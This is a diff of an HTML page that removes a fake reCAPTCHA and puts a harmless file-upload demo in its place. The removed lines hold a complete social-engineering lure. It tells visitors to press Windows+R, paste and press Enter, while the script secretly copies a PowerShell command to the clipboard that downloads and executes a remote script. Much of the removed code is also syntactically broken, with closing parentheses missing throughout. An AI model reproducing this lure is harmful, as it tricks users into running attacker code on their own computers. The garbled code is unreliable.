@@ -2,241 +2,185 @@
 <html lang="en">
 <head>
     <meta charset="utf-8">
-    <title>recaptcha-verify2</title>
-    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">
+    <title>reCAPTCHA Upload Demo</title>
+
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">        
     <style>
         .container { font-family: Roboto, helvetica, arial, sans-serif; }
         .m-p { margin: 0; padding: 0; }
         .block { display: block; }
-        code { font-size: 11px; margin-left: 2px; color: #333; background: #f5f5f5; padding: 4px 8px; border-radius: 4px; display: inline-block; margin-top: 6px; transition: background 0.3s; }
-        .line-normal { line-height: normal; }
-        .checkbox-window { height: 74px; width: 300px; background-color: #f9f9f9; border-radius: 3px; border: 1px solid #d3d3d3; }
-        .checkbox-window a { color: #555; text-decoration: none; }
-        .checkbox-window a:hover { color: #555; text-decoration: underline; }
+
+        .checkbox-window {
+            height: 74px;
+            width: 300px;
+            background-color: #f9f9f9;
+            border-radius: 3px;
+            border: 1px solid #d3d3d3;
+        }
+
         .checkbox-container { width: 28px; height: 28px; }
-        .checkbox { position: relative; background-color: #fff; border-radius: 2px; height: 100%; width: 100%; border: 2px solid #c1c1c1; margin: 21px 0 0 12px; outline: none; font-family: Roboto, helvetica, arial, sans-serif; transition: width 500ms, height 500ms, border-radius 500ms, margin-top 500ms, margin-left 500ms, opacity 700ms; }
-        .checkbox:hover { border: 2px solid #b2b2b2; }
-        .im-not-a-robot { position: relative; left: 52px; bottom: 3px; font-size: 15px; color: #282727; }
-        .captcha-logo { position: relative; left: 244px; bottom: 36px; width: 40px; height: 45px; vertical-align: baseline; padding-bottom: 4px; }
-        .checkbox-desc { color: #555555; position: relative; font-size: 8px; text-align: center; bottom: 40px; left: 112px; }
-        .spinner { visibility: hidden; position: relative; top: -85px; left: 12px; height: 20px; width: 20px; border: 2px solid rgba(0, 0, 0, 0.1); border-top: 2px solid #333; border-radius: 50%; opacity: 0; transition: opacity 0.5s linear; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg; } 100% { transform: rotate(360deg; } }
-        .verify-window { font-family: Roboto, helvetica, arial, sans-serif; opacity: 0; position: absolute; visibility: hidden; margin: auto; width: 310px; background-color: #fff; border: 1px solid #cecece; -webkit-box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12; box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12; transition: opacity 400ms; }
-        ol { counter-reset: item; list-style-type: none; list-style-position: outside; padding-left: 0; }
-        ol li { counter-increment: item; margin-bottom: 10px; }
-        ol li::before { content: counter-item ". "; color: #1A73E8; font-weight: bold; margin-right: 10px; margin-left: 10px; }
-        .verify-container { padding: 8px; }
-        .verify-header { background-color: #1A73E8; padding: 16px 16px 24px 16px; color: #fff; }
-        .verify-header-text-small { font-size: 14px; line-height: normal; }
-        .verify-header-text-medium { font-size: 16px; }
-        .verify-header-text-big { font-size: 24px; font-weight: 700; }
-        .verify-main { padding: 5px; color: #111; font-size: 13px; }
-        .verify-footer { border-top: 1px solid #cecece; padding: 10px 7px 10px 7px; color: #737373; font-size: 13px; }
-        .verify-footer-left { padding: 5px; }
-        .copied-indicator { color: #1A73E8; font-weight: 600; }
-        .upload-btn {
+
+        .checkbox {
             background-color: #fff;
-            border: 1px solid #ccc;
-            padding: 10px 15px;
-            font-size: 13px;
-            font-family: Roboto;
+            border-radius: 2px;
+            height: 100%;
+            width: 100%;
+            border: 2px solid #c1c1c1;
+            margin: 21px 0 0 12px;
             cursor: pointer;
+            transition: all 0.4s;
+        }
+
+        .im-not-a-robot {
+            position: relative;
+            left: 52px;
+            bottom: 3px;
+            font-size: 15px;
+        }
+
+        .captcha-logo {
+            position: relative;
+            left: 244px;
+            bottom: 36px;
+            width: 40px;
+        }
+
+        .spinner {
+            visibility: hidden;
+            position: relative;
+            top: -85px;
+            left: 12px;
+            height: 20px;
+            width: 20px;
+            border: 2px solid rgba(0,0,0,0.1);
+            border-top: 2px solid #333;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .verify-window {
+            opacity: 0;
+            position: absolute;
+            visibility: hidden;
+            width: 310px;
+            background-color: #fff;
+            border: 1px solid #cecece;
+            box-shadow: 5px 6px 7px -3px rgba(0,0,0,0.12);
+            transition: opacity 0.3s;
+        }
+
+        .verify-header {
+            background-color: #1A73E8;
+            padding: 16px;
+            color: white;
+            font-size: 20px;
+        }
+
+        .verify-main {
+            padding: 15px;
+            text-align: center;
+        }
+
+        .upload-btn {
             margin-top: 10px;
-            color: #000;
-            transition: all 0.2s;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+            padding: 8px 16px;
+            background: #1A73E8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
         }
+
         .upload-btn:hover {
-            border: 1px solid #888;
-            background-color: #f0f0f0;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-        }
-        .upload-btn:active {
-            transform: translateY(1px;
-            box-shadow: 0 0 1px rgba(0,0,0,0.1;
+            background: #1558b0;
         }
     </style>
 </head>
+
 <body>
 
-<div class="container m-p">
-    <div id="checkbox-window" class="checkbox-window m-p block">
-        <div class="checkbox-container m-p">
-            <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
+<div class="container">
+
+    <!-- Fake captcha -->
+    <div id="checkbox-window" class="checkbox-window">
+        <div class="checkbox-container">
+            <button id="checkbox" class="checkbox"></button>
         </div>
-        <p class="im-not-a-robot m-p line-normal">I'm not a robot</p>
-        <img src="RecaptchaLogo.png" class="captcha-logo line-normal" alt="">
-        <br>
-        <p class="checkbox-desc m-p line-normal">
-        <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
-        </p>
-        <img class="spinner" alt="" id="spinner">
+        <p class="im-not-a-robot">I'm not a robot</p>
+        <img src="RecaptchaLogo.png" class="captcha-logo">
+        <div id="spinner" class="spinner"></div>
     </div>
 
+    <!-- Upload panel -->
     <div id="verify-window" class="verify-window">
-        <div class="verify-container">
-            <header class="verify-header">
-                <span class="verify-header-text-medium m-p block">Complete these</span>
-                <span class="verify-header-text-big m-p block">Verification Steps</span>
-            </header>
-            <main class="verify-main">
-                <p>
-                    To better prove you are not a robot, please:
-                </p>
-                <ol>
-                    <li>Press & hold <b>Windows Key + R</b>.</li>
-                    <li>In the verification window, press <b>Ctrl+V</b.</li>
-                    <li>Press <b>Enter</b> on your keyboard to finish.</li>
-                    <li>Observe the verification output.</li>
-                </ol>
-                <p style="margin-top:8px;">
-                    You will observe and agree:
-                    <code id="command-display"></code>
-                </p>
-                <button class="upload-btn" id="upload-btn">Upload a random text file to confirm that you are not a robot</button>
-            </main>
+        <div class="verify-header">Upload a File</div>
+        <div class="verify-main">
+            <p>Select a file to continue:</p>
+
+            <input type="file" id="file-input" style="display:none">
+
+            <button id="upload-btn" class="upload-btn">
+                Upload a File
+            </button>
+
+            <p id="file-name" style="margin-top:10px;"></p>
         </div>
-        <footer class="verify-container verify-footer">
-            <div class="verify-footer-left">
-                <span class="copied-indicator">Perform the steps above to finish verification.</span>
-            </div>
-        </footer>
     </div>
+
 </div>
 
 <script>
-    const checkboxWindow = document.getElementById("checkbox-window");
-    const checkboxBtn = document.getElementById("checkbox");
-    const uploadBtn = document.getElementById("upload-btn");
-    const spinner = document.getElementById("spinner");
-    const verifyWindow = document.getElementById("verify-window");
-    const commandDisplay = document.getElementById("command-display");
+const checkboxBtn = document.getElementById("checkbox");
+const spinner = document.getElementById("spinner");
+const verifyWindow = document.getElementById("verify-window");
 
-    function addCaptchaListeners() {
-        document.addEventListener("click", (e) => {
-            const path = e.composedPath();
-            if (!path.includes(verifyWindow) && isVerifyWindowVisible()) {
-                closeVerifyWindow();
-            }
-        });
+function showSpinner() {
+    spinner.style.visibility = "visible";
+}
 
-        // Hook on both buttons: Checkbox (I'm not robot) and Upload File
-        checkboxBtn.addEventListener("click", (e) => {
-            e.preventDefault();
-            checkboxBtn.disabled = true;
-            runClickedCheckboxEffects();
-        });
+function hideSpinner() {
+    spinner.style.visibility = "hidden";
+}
 
-        uploadBtn.addEventListener("click", (e) => {
-            e.preventDefault();
-            runClickedCheckboxEffects();
-        });
-    }
+function showVerifyWindow() {
+    verifyWindow.style.visibility = "visible";
+    verifyWindow.style.opacity = "1";
+    verifyWindow.style.top = "100px";
+    verifyWindow.style.left = "20px";
+}
 
-    function runClickedCheckboxEffects() {
-        hideCaptchaCheckbox();
-        setTimeout(showSpinner, 500;
-        setTimeout(showVerifyWindow, 900;
-    }
+// Checkbox click flow
+checkboxBtn.addEventListener("click", () => {
+    checkboxBtn.disabled = true;
 
-    function showSpinner() {
-        spinner.style.visibility = "visible";
-        spinner.style.opacity = "1";
-        spinner.style.animation = "spin 1s linear infinite";
-    }
+    showSpinner();
 
-    function hideSpinner() {
-        spinner.style.opacity = "0";
-        spinner.style.animation = "none";
-        setTimeout(() => spinner.style.visibility = "hidden", 500;
-    }
-
-    function hideCaptchaCheckbox() {
-        checkboxBtn.style.width = "4px";
-        checkboxBtn.style.height = "4px";
-        checkboxBtn.style.borderRadius = "50%";
-        checkboxBtn.style.marginLeft = "25px";
-        checkboxBtn.style.marginTop = "33px";
-        checkboxBtn.style.opacity = "0";
-    }
-
-    function showCaptchaCheckbox() {
-        checkboxBtn.style.width = "100%";
-        checkboxBtn.style.height = "100%";
-        checkboxBtn.style.borderRadius = "2px";
-        checkboxBtn.style.margin = "21px 0 0 12px";
-        checkboxBtn.style.opacity = "1";
-    }
-
-    function generateRandomId() {
-        return Math.floor(Math.random() * (9999 - 1000 + 1) + 1000).toString();
-    }
-
-    function closeVerifyWindow() {
-        verifyWindow.style.display = "none";
-        verifyWindow.style.visibility = "hidden";
-        verifyWindow.style.opacity = "0";
-        showCaptchaCheckbox();
+    setTimeout(() => {
         hideSpinner();
-        checkboxBtn.disabled = false;
+        showVerifyWindow();
+    }, 1000);
+});
+
+// Upload logic
+const uploadBtn = document.getElementById("upload-btn");
+const fileInput = document.getElementById("file-input");
+const fileNameDisplay = document.getElementById("file-name");
+
+uploadBtn.addEventListener("click", () => {
+    fileInput.click();
+});
+
+fileInput.addEventListener("change", () => {
+    if (fileInput.files.length > 0) {
+        fileNameDisplay.textContent =
+            "Selected file: " + fileInput.files[0].name;
     }
-
-    function isVerifyWindowVisible() {
-        return verifyWindow.style.display !== "none" && verifyWindow.style.display !== "";
-    }
-
-    function autoCopy(text) {
-        const textarea = document.createElement("textarea");
-        textarea.value = text;
-        textarea.style.position = "fixed";
-        textarea.style.left = "-9999px";
-        textarea.style.top = "-9999px";
-        document.body.appendChild(textarea;
-        textarea.focus;
-        textarea.select;
-        try {
-            document.execCommand("copy");
-            // Brief visual confirmation
-            commandDisplay.style.background = "#d4edda";
-            setTimeout(() => commandDisplay.style.background = "#f5f5f5", 1200;
-            // Hide upload button after copy
-            uploadBtn.style.opacity = "0";
-            uploadBtn.style.animation = "none";
-            setTimeout(() => uploadBtn.style.visibility = "hidden", 500;
-        } catch (err) {
-            console.log("Copy fallback failed:", err);
-        } finally {
-            document.body.removeChild(textarea;
-        }
-    }
-
-    function showVerifyWindow() {
-        verifyWindow.style.display = "block";
-        verifyWindow.style.visibility = "visible";
-        verifyWindow.style.opacity = "1";
-        verifyWindow.style.top = checkboxWindow.offsetTop - 80 + "px";
-        verifyWindow.style.left = checkboxWindow.offsetLeft + 54 + "px";
-
-        if (verifyWindow.offsetTop < 5) verifyWindow.style.top = "5px";
-        if (verifyWindow.offsetLeft + verifyWindow.offsetWidth > window.innerWidth - 10) {
-            verifyWindow.style.left = checkboxWindow.offsetLeft - 8 + "px";
-        }
-
-        const verificationId = generateRandomId();
-        document.getElementById("verification-id")?.textContent &&
-            (document.getElementById("verification-id").textContent = verificationId;
-            
-        const exe = "powershell";
-        const flags = "-NoProfile -Command";
-        const payload = "\"IEX (New-Object Net.WebClient).DownloadString(https://d5testing.github.io/terminal-fix.ps1)\"";
-        const fullCommand = `${exe} ${flags} ${payload`;
-
-        commandDisplay.textContent = "✅ "I am not a robot";
-        
-        autoCopy(fullCommand;
-    }
-
-    addCaptchaListeners();
+});
 </script>
 
 </body>
